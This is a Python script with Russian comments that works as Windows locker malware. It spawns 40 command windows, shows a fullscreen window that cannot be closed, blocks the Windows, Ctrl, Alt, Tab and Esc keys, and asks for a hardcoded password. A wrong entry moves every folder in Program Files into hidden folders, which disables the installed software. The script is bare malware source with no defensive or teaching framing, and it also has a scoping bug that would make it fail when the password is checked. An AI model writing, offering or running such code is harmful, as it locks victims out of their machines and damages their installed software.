import tkinter as tk
from tkinter import simpledialog, messagebox
import subprocess
import os
import shutil
import keyboard  # Для блокировки клавиш

def open_cmd_windows():
    for _ in range(40):
        subprocess.Popen('start cmd', shell=True)

def disable_event(event):
    if event.keysym in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9'):
        return
    else:
        return "break"

def block_keys():
    # Блокировка клавиш Windows
    keyboard.block_key('left windows')
    keyboard.block_key('right windows')
    # Блокировка клавиш Ctrl+Alt+Del, Alt+Tab, Ctrl+Shift+Esc
    keyboard.block_key('ctrl')
    keyboard.block_key('alt')
    keyboard.block_key('tab')
    keyboard.block_key('esc')

def delete_programs():
    program_files = os.environ['ProgramFiles']
    program_files_x86 = os.environ['ProgramFiles(x86)']

    hidden_folder = os.path.join(program_files, 'HiddenPrograms')
    hidden_folder_x86 = os.path.join(program_files_x86, 'HiddenPrograms')

    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
    if not os.path.exists(hidden_folder_x86):
        os.makedirs(hidden_folder_x86)

    for item in os.listdir(program_files):
        item_path = os.path.join(program_files, item)
        if os.path.isdir(item_path) and item != 'HiddenPrograms':
            try:
                shutil.move(item_path, hidden_folder)
            except Exception as e:
                print(f"Не удалось переместить {item}: {e}")

    for item in os.listdir(program_files_x86):
        item_path = os.path.join(program_files_x86, item)
        if os.path.isdir(item_path) and item != 'HiddenPrograms':
            try:
                shutil.move(item_path, hidden_folder_x86)
            except Exception as e:
                print(f"Не удалось переместить {item}: {e}")

def check_password():
    password = simpledialog.askstring("Пароль", "Введите пароль:", show='*')
    if password == '2914':
        messagebox.showinfo("Успех", "Правильный пароль! Закрытие всех окон.")
        root.destroy()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль! Все приложения будут удалены.")
        delete_programs()
        root.destroy()  # Закрыть приложение

def main():
    # Открытие 40 командных строк
    open_cmd_windows()

    # Создание главного окна
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(background='white')

    # Отключаем стандартное закрытие окна
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Блокируем все клавиши, кроме цифровых
    root.bind_all('<Key>', disable_event)

    # Блокируем клавиши Windows и другие комбинации
    block_keys()

    # Запрашиваем пароль
    root.after(1000, lambda: check_password())  # 1 попытка для ввода пароля

    # Показываем окно и запускаем главный цикл
    root.mainloop()

if __name__ == "__main__":
    main()
